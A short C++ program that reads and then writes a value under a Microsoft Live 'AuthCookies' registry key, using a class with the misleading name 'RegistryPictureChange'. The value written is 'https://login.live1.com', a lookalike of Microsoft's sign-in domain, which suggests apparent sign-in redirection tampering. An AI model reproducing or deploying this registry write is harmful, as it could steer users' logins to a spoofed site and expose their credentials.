#include <iostream>
#include "MainInclude.hpp"
#include <string>
#include <sstream>

int main()
{
    HKEY hKey;
    // Initializing path to the registry
    std::string str_path = "SOFTWARE\\Microsoft\\AuthCookies\\Live\\Default\\CAW";
    // String conversion to LPCSTR
    LPCSTR StringPath = str_path.c_str();

    RegistryPictureChange RegPicObj(&hKey, StringPath, REG_SZ);
    std::string NameOfRegistry = "Test";

    LPCSTR StringNameOfRegistry = NameOfRegistry.c_str();

    //auto valueOfRegistry = 0;
    size_t size = 256;
    char buffer[size];

    LPSTR Lp_buffer = buffer;
    
    long result = RegPicObj.CheckRegistry(Lp_buffer, StringNameOfRegistry);

    if (result != 0)
    {
        std::cout<< "Error with code: " <<result <<std::endl;
        return 0;
    }

    LPCSTR lpData = "https://login.live1.com";

    long WriteResult = RegPicObj.WriteRegistry( lpData, StringNameOfRegistry);
    
    return 0;
}